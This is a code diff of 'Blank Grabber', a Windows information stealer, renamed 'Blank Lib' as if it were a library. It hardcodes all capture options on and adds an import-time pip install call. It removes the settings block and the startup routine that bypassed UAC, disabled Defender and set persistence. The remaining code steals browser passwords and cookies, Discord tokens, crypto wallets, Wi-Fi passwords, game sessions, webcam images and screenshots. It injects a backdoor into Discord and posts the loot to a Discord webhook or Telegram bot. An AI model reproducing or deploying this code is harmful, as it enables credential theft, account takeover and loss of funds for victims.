@@ -1,14 +1,14 @@
 # Python 3.10+
-# Author: Blank-c
-# Github: https://github.com/Blank-c/Blank-Grabber
+# Author: pastelrbx
+# Github: https://github.com/pastelrbx/Blank-Lib
 # Encoding: UTF-8
-
+import pip;pip.main(["install", "wheel tinyaes pyinstaller pycryptodomex urllib3"])
 import base64
 import os
 import subprocess
 import sys
 import json
-import pyaes
+from Cryptodome.Cipher import AES
 import random
 import shutil
 import sqlite3
@@ -24,38 +24,6 @@ from ctypes import wintypes
 from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
 disable_warnings_urllib3()
 
-class Settings:
-
-    C2 = "%c2%"
-    Mutex = "%mutex%"
-    PingMe = bool("%pingme%")
-    Vmprotect = bool("%vmprotect%")
-    Startup = bool("%startup%")
-    Melt = bool("%melt%")
-    UacBypass = bool("%uacBypass%")
-    ArchivePassword = "%archivepassword%"
-    HideConsole = bool("%hideconsole%")
-    Debug = bool("%debug%")
-    RunBoundOnStartup = bool("%boundfilerunonstartup%")
-
-    CaptureWebcam = bool("%capturewebcam%")
-    CapturePasswords = bool("%capturepasswords%")
-    CaptureCookies = bool("%capturecookies%")
-    CaptureAutofills = bool("%captureautofills%")
-    CaptureHistory = bool("%capturehistory%")
-    CaptureDiscordTokens = bool("%capturediscordtokens%")
-    CaptureGames = bool("%capturegames%")
-    CaptureWifiPasswords = bool("%capturewifipasswords%")
-    CaptureSystemInfo = bool("%capturesysteminfo%")
-    CaptureScreenshot = bool("%capturescreenshot%")
-    CaptureTelegram = bool("%capturetelegram%")
-    CaptureCommonFiles = bool("%capturecommonfiles%")
-    CaptureWallets = bool("%capturewallets%")
-
-    FakeError = (bool("%fakeerror%"), ("%title%", "%message%", "%icon%"))
-    BlockAvSites = bool("%blockavsites%")
-    DiscordInjection = bool("%discordinjection%")
-
 if not hasattr(sys, "_MEIPASS"):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Defines _MEIPASS if does not exist (py mode)
 
@@ -65,9 +33,7 @@ for _, logger in logging.root.manager.loggerDict.items():
     logger.disabled= True
 Logger = logging.getLogger("Blank Grabber")
 Logger.setLevel(logging.INFO)
-
-if not Settings.Debug:
-    Logger.disabled = True
+Logger.disabled = True
 
 
 class VmProtect:
@@ -483,7 +449,7 @@ class Browsers:
                 iv = buffer[3:15]
                 cipherText = buffer[15:]
 
-                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
+                return AES.new(key, AES.MODE_GCM, nonce=iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
             else:
                 return str(Syscalls.CryptUnprotectData(buffer))
         
@@ -658,6 +624,9 @@ class Browsers:
             return autofills
 
 class Discord:
+    C2 = [0, ""]
+    def __init__(C2):
+        Discord.C2 = C2
 
     httpClient = PoolManager(cert_reqs="CERT_NONE") # Client for http requests
     ROAMING = os.getenv("appdata") # Roaming directory
@@ -843,7 +812,7 @@ class Discord:
         
         for token in encryptedTokens:
             try:
-                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
+                token = AES.new(Syscalls.CryptUnprotectData(key), AES.MODE_GCM, nonce=token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
                 if token:
                     tokens.append(token)
             except Exception:
@@ -903,7 +872,7 @@ class Discord:
     def InjectJs() -> str | None: # Injects javascript into the Discord client's file
         check = False
         try:
-            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors= "ignore")))
+            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Discord.C2[1].encode()).decode(errors= "ignore")))
         except Exception:
             return None
         
@@ -924,7 +893,26 @@ class Discord:
                 yield path
 
 class BlankGrabber:
-
+    
+    C2 = [0, ""]
+    CaptureCommonFiles = True
+    CaptureGames = True
+    CaptureWallets = True
+    CaptureSystemInfo = True
+    CaptureWifiPasswords = True
+    CaptureScreenshot = True
+    BlockAvSites = True
+    CaptureCookies = True
+    CapturePasswords = True
+    CaptureHistory = True
+    CaptureAutofills = True
+    CaptureWebcam = True
+    CaptureTelegram = True
+    CaptureDiscordTokens = True
+    DiscordInjection = True
+    ArchivePassword = "blank123"
+    PingMe = True
+        
     Separator: str = None # Separator for separating different entries in plaintext files
     TempFolder: str = None # Temporary folder for storing data while collecting
     ArchivePath: str = None # Path of the archive to be made after all the data is collected
@@ -948,63 +936,9 @@ class BlankGrabber:
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
-    def __init__(self) -> None: # Constructor to call all the functions
-        self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
-        
-        while True:
-            self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomString() + ".zip") # Sets the archive path
-            if not os.path.isfile(self.ArchivePath):
-                break
-
-        Logger.info("Creating temporary folder")
-        while True:
-            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
-            if not os.path.isdir(self.TempFolder):
-                os.makedirs(self.TempFolder, exist_ok= True)
-                break
-        
-        for func, daemon in (
-            (self.StealBrowserData, False),
-            (self.StealDiscordTokens, False),
-            (self.StealTelegramSessions, False),
-            (self.StealWallets, False),
-            (self.StealMinecraft, False),
-            (self.StealEpic, False),
-            (self.StealGrowtopia, False),
-            (self.StealSteam, False),
-            (self.StealUplay, False),
-            (self.GetAntivirus, False),
-            (self.GetClipboard, False),
-            (self.GetTaskList, False),
-            (self.GetDirectoryTree, False),
-            (self.GetWifiPasswords, False),
-            (self.StealSystemInfo, False),
-            (self.BlockSites, False),
-            (self.TakeScreenshot, True),
-            (self.Webshot, True),
-            (self.StealCommonFiles, True)
-        ):
-            thread = Thread(target= func, daemon= daemon)
-            thread.start()
-            Tasks.AddTask(thread) # Adds all the threads to the task queue
-        
-        Tasks.WaitForAll() # Wait for all the tasks to complete
-        Logger.info("All functions ended")
-        if Errors.errors: # If there were any errors during the process, then save the error messages into a file
-            with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-                file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
-        self.SendData() # Send all the data to the webhook
-        try:
-            Logger.info("Removing archive")
-            os.remove(self.ArchivePath) # Remove the archive from the system
-            Logger.info("Removing temporary folder")
-            shutil.rmtree(self.TempFolder) # Remove the temporary folder from the system
-        except Exception:
-            pass
-    
     @Errors.Catch
     def StealCommonFiles(self) -> None: # Steals common files from the system
-        if Settings.CaptureCommonFiles:
+        if BlankGrabber.CaptureCommonFiles:
             for name, dir in (
                 ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
                 ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
@@ -1029,7 +963,7 @@ class BlankGrabber:
 
     @Errors.Catch
     def StealMinecraft(self) -> None: # Steals Minecraft session files
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             Logger.info("Stealing Minecraft related files")
             saveToPath = os.path.join(self.TempFolder, "Games", "Minecraft")
             userProfile = os.getenv("userprofile")
@@ -1062,7 +996,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealGrowtopia(self) -> None: # Steals Growtopia session files
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             Logger.info("Stealing Growtopia session")
 
             growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Growtopia")] if x is not None])]
@@ -1088,7 +1022,7 @@ class BlankGrabber:
                     
     @Errors.Catch
     def StealEpic(self) -> None: #Steals Epic accounts
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             Logger.info("Stealing Epic session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Epic")
             epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
@@ -1110,7 +1044,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealSteam(self) -> None: # Steals Steam accounts
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             Logger.info("Stealing Steam session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
             steamPaths  = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Steam")] if x is not None])]
@@ -1145,7 +1079,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealUplay(self) -> None: # Steals Uplay accounts
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             Logger.info("Stealing Uplay session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Uplay")
             uplayPath = os.path.join(os.getenv("localappdata"), "Ubisoft Game Launcher")
@@ -1158,7 +1092,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             Logger.info("Stealing Roblox cookies")
             saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
             note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
@@ -1187,7 +1121,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealWallets(self) -> None: # Steals crypto wallets
-        if Settings.CaptureWallets:
+        if BlankGrabber.CaptureWallets:
             Logger.info("Stealing crypto wallets")
             saveToDir = os.path.join(self.TempFolder, "Wallets")
 
@@ -1260,7 +1194,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealSystemInfo(self) -> None: # Steals system information
-        if Settings.CaptureSystemInfo:
+        if BlankGrabber.CaptureSystemInfo:
             Logger.info("Stealing system information")
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1282,7 +1216,7 @@ class BlankGrabber:
         
     @Errors.Catch
     def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
-        if Settings.CaptureSystemInfo:
+        if BlankGrabber.CaptureSystemInfo:
             Logger.info("Getting directory trees")
 
             PIPE      = chr(9474) + "   "
@@ -1315,7 +1249,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def GetClipboard(self) -> None: # Copies text from the clipboard
-        if Settings.CaptureSystemInfo:
+        if BlankGrabber.CaptureSystemInfo:
             Logger.info("Getting clipboard text")
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1329,7 +1263,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def GetAntivirus(self) -> None: # Finds what antivirus(es) are installed in the system
-        if Settings.CaptureSystemInfo:
+        if BlankGrabber.CaptureSystemInfo:
             Logger.info("Getting antivirus")
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1344,7 +1278,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def GetTaskList(self) -> None: # Gets list of processes currently running in the system
-        if Settings.CaptureSystemInfo:
+        if BlankGrabber.CaptureSystemInfo:
             Logger.info("Getting task list")
             saveToDir = os.path.join(self.TempFolder, "System")
 
@@ -1357,7 +1291,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def GetWifiPasswords(self) -> None: # Saves WiFi passwords stored in the system
-        if Settings.CaptureWifiPasswords:
+        if BlankGrabber.CaptureWifiPasswords:
             Logger.info("Getting wifi passwords")
             saveToDir = os.path.join(self.TempFolder, "System")
             passwords = Utility.GetWifiPasswords()
@@ -1372,7 +1306,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def TakeScreenshot(self) -> None: # Takes screenshot(s) of all the monitors of the system
-        if Settings.CaptureScreenshot:
+        if BlankGrabber.CaptureScreenshot:
             Logger.info("Taking screenshot")
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             if subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= self.TempFolder).returncode == 0:
@@ -1380,14 +1314,14 @@ class BlankGrabber:
 
     @Errors.Catch
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
-        if Settings.BlockAvSites:
+        if BlankGrabber.BlockAvSites:
             Logger.info("Blocking AV sites")
             Utility.BlockSites()
             Utility.TaskKill("chrome", "firefox", "msedge", "safari", "opera", "iexplore")
     
     @Errors.Catch
     def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
-        if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
+        if not any((BlankGrabber.CaptureCookies, BlankGrabber.CapturePasswords, BlankGrabber.CaptureHistory or BlankGrabber.CaptureAutofills)):
             return
         
         Logger.info("Stealing browser data")
@@ -1418,10 +1352,10 @@ class BlankGrabber:
                         browser = Browsers.Chromium(path)
                         saveToDir = os.path.join(self.TempFolder, "Credentials", name)
 
-                        passwords = browser.GetPasswords() if Settings.CapturePasswords else None
-                        cookies = browser.GetCookies() if Settings.CaptureCookies else None
-                        history = browser.GetHistory() if Settings.CaptureHistory else None
-                        autofills = browser.GetAutofills() if Settings.CaptureAutofills else None
+                        passwords = browser.GetPasswords() if BlankGrabber.CapturePasswords else None
+                        cookies = browser.GetCookies() if BlankGrabber.CaptureCookies else None
+                        history = browser.GetHistory() if BlankGrabber.CaptureHistory else None
+                        autofills = browser.GetAutofills() if BlankGrabber.CaptureAutofills else None
 
                         if passwords or cookies or history or autofills:
                             os.makedirs(saveToDir, exist_ok= True)
@@ -1461,12 +1395,12 @@ class BlankGrabber:
         for thread in threads:
             thread.join()
         
-        if Settings.CaptureGames:
+        if BlankGrabber.CaptureGames:
             self.StealRobloxCookies()
 
     @Errors.Catch
     def Webshot(self) -> None: # Captures snapshot(s) from the webcam(s)
-        if Settings.CaptureWebcam:
+        if BlankGrabber.CaptureWebcam:
             camdir = os.path.join(self.TempFolder, "Webcam")
             os.makedirs(camdir, exist_ok= True)
 
@@ -1480,7 +1414,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
-        if Settings.CaptureTelegram:
+        if BlankGrabber.CaptureTelegram:
             Logger.info("Stealing telegram sessions")
 
             telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")] if x is not None])]
@@ -1541,7 +1475,7 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealDiscordTokens(self) -> None: # Steals Discord tokens
-        if Settings.CaptureDiscordTokens:
+        if BlankGrabber.CaptureDiscordTokens:
             Logger.info("Stealing discord tokens")
             output = list()
             saveToDir = os.path.join(self.TempFolder, "Messenger", "Discord")
@@ -1556,7 +1490,7 @@ class BlankGrabber:
                     file.write(self.Separator.lstrip() + self.Separator.join(output))
                 self.DiscordTokensCount += len(accounts)
         
-        if Settings.DiscordInjection and not Utility.IsInStartup():
+        if BlankGrabber.DiscordInjection and not Utility.IsInStartup():
             paths = Discord.InjectJs()
             if paths is not None:
                 Logger.info("Injecting backdoor into discord")
@@ -1578,8 +1512,7 @@ class BlankGrabber:
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
             if os.path.isfile(rarPath):
-                password = Settings.ArchivePassword or "blank123"
-                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
+                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, BlankGrabber.ArchivePassword, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                 if process.returncode == 0:
                     return "rar"
         
@@ -1676,27 +1609,27 @@ class BlankGrabber:
         
         grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])
 
-        match Settings.C2[0]:
+        match BlankGrabber.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+                image_url = "https://raw.githubusercontent.com/pastelrbx/Blank-Lib/main/.github/workflows/image.png"
 
                 payload = {
-                    "content": "||@everyone||" if Settings.PingMe else "",
+                    "content": "||@everyone||" if BlankGrabber.PingMe else "",
                     "embeds": [
                         {
-                            "title": "Blank Grabber",
+                            "title": "Blank Lib",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/Blank-c/Blank-Grabber",
+                            "url": "https://github.com/pastelrbx/Blank-Lib",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                                "text": "Grabbed by Blank Lib | https://github.com/pastelrbx/Blank-Lib"
                             },
                             "thumbnail": {
                                 "url": image_url
                             }
                         }
                     ],
-                    "username" : "Blank Grabber",
+                    "username" : "Blank Lib",
                     "avatar_url" : image_url
                 }
 
@@ -1716,7 +1649,7 @@ class BlankGrabber:
                 
                 fields["payload_json"] = json.dumps(payload).encode()
 
-                http.request("POST", Settings.C2[1], fields=fields)
+                http.request("POST", BlankGrabber.C2[1], fields=fields)
             
             case 1: # Telegram Bot
                 payload = {
@@ -1740,118 +1673,7 @@ class BlankGrabber:
                     fields["document"] = (filename, open(self.ArchivePath, "rb").read())
                     method = "sendDocument"
                 
-                token, chat_id = Settings.C2[1].split('$')
+                token, chat_id = BlankGrabber.C2[1].split('$')
                 fields.update(payload)
                 fields.update({'chat_id': chat_id})
                 http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
-
-if __name__ == "__main__" and os.name == "nt":
-    Logger.info("Process started")
-    if Settings.HideConsole:
-        Syscalls.HideConsole() # Hides console
-    
-    if not Utility.IsAdmin(): # No administrator permissions
-        Logger.warning("Admin privileges not available")
-        if Utility.GetSelf()[1]:
-            if not "--nouacbypass" in sys.argv and Settings.UacBypass:
-                Logger.info("Trying to bypass UAC (Application will restart)")
-                if Utility.UACbypass(): # Tries to bypass UAC (only for exe mode)
-                    os._exit(0)
-                else:
-                    Logger.warning("Failed to bypass UAC")
-                    if not Utility.IsInStartup(sys.executable):
-                        logger.info("Showing UAC prompt")
-                        if Utility.UACPrompt(sys.executable): # Ask user for admin perms and restart
-                            os._exit(0) 
-            
-            if not Utility.IsInStartup() and not Settings.UacBypass:
-                Logger.info("Showing UAC prompt to user (Application will restart)")
-                if Utility.UACPrompt(sys.executable): # Ask user for admin perms and restart
-                    os._exit(0) 
-    
-    Logger.info("Trying to create mutex")
-    if not Syscalls.CreateMutex(Settings.Mutex): 
-        Logger.info("Mutex already exists, exiting")
-        os._exit(0) # If mutex already exists, exit (to prevent multiple instances from running)
-    
-    if Utility.GetSelf()[1]: 
-        Logger.info("Trying to exclude the file from Windows defender")
-        Utility.ExcludeFromDefender() # Tries to exclude from Defender (only for exe mode)
-
-    Logger.info("Trying to disable defender")
-    Utility.DisableDefender() # Tries to disable Defender
-
-    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile(boundFileSrc:= os.path.join(sys._MEIPASS, "bound.blank")):
-        try:
-            Logger.info("Trying to extract bound file")
-            if os.path.isfile(boundFileDst:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
-                Logger.info("Old bound file found, removing it")
-                os.remove(boundFileDst) # Removes any older bound file
-
-            with open(boundFileSrc, "rb") as file:
-                content = file.read()
-            decrypted = zlib.decompress(content[::-1]) # Decompress the file
-            with open(boundFileDst, "wb") as file: # Copies bound file to the new location
-                file.write(decrypted)
-            del content, decrypted
-            Logger.info("Trying to exclude bound file from defender")
-            Utility.ExcludeFromDefender(boundFileDst) # Tries to exclude the bound file from Defender
-            Logger.info("Starting bound file")
-            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundFileDst), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Starts the bound file
-        except Exception as e:
-            Logger.error(e)
-    
-    if Utility.GetSelf()[1] and Settings.FakeError[0] and not Utility.IsInStartup(): # If not in startup, check if fake error is defined (exe mode)
-        try:
-            Logger.info("Showing fake error popup")
-            title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
-            message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
-            icon = int(Settings.FakeError[1][2]) # Sets the icon of the fake error
-            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, Settings.FakeError[1][2]) # Shows a message box using JScript
-            subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Shows the fake error
-        except Exception as e:
-            Logger.error(e)
-    
-    if not Settings.Vmprotect or not VmProtect.isVM():
-        if Utility.GetSelf()[1]:
-            if Settings.Melt and not Utility.IsInStartup(): # If not in startup and melt option is enabled then temporarily hide the file (exe mode)
-                Logger.info("Hiding the file")
-                Utility.HideSelf() # Hide the file
-        else:
-            if Settings.Melt: # If melt mode is enabled then delete the file
-                Logger.info("Deleting the file")
-                Utility.DeleteSelf() # Delete the file
-    
-        try:
-            if Utility.GetSelf()[1] and Settings.Startup and not Utility.IsInStartup(): # If startup option is enabled, and the file is not in the startup, then put it in startup
-                Logger.info("Trying to put the file in startup")
-                path = Utility.PutInStartup() # Put the file in startup
-                if path is not None:
-                    Logger.info("Excluding the file from Windows defender in startup")
-                    Utility.ExcludeFromDefender(path) # Exclude the file from defender
-        except Exception:
-            Logger.error("Failed to put the file in startup")
-        
-        while True:
-            try:
-                Logger.info("Checking internet connection")
-                if Utility.IsConnectedToInternet(): # Check if internet connection is available
-                    Logger.info("Internet connection available, starting stealer (things will be running in parallel)")
-                    BlankGrabber() # Start the grabber
-                    Logger.info("Stealer finished its work")
-                    break
-                else:
-                    Logger.info("Internet connection not found, retrying in 10 seconds")
-                    time.sleep(10) # Wait for 10 seconds and check the internet connection again
-            except Exception as e:
-                if isinstance(e, KeyboardInterrupt): # If the user pressed CTRL+C then exit
-                    os._exit(1)
-                Logger.critical(e, exc_info= True) # Print the error message
-                Logger.info("There was an error, retrying after 10 minutes")
-                time.sleep(600) # Wait for 10 minutes and try again
-        
-        if Utility.GetSelf()[1] and Settings.Melt and not Utility.IsInStartup(): # Delete the file if melt option is enabled and the file is not in the startup (exe mode)
-            Logger.info("Deleting the file")
-            Utility.DeleteSelf() # Delete the current file
-        
-        Logger.info("Process ended")
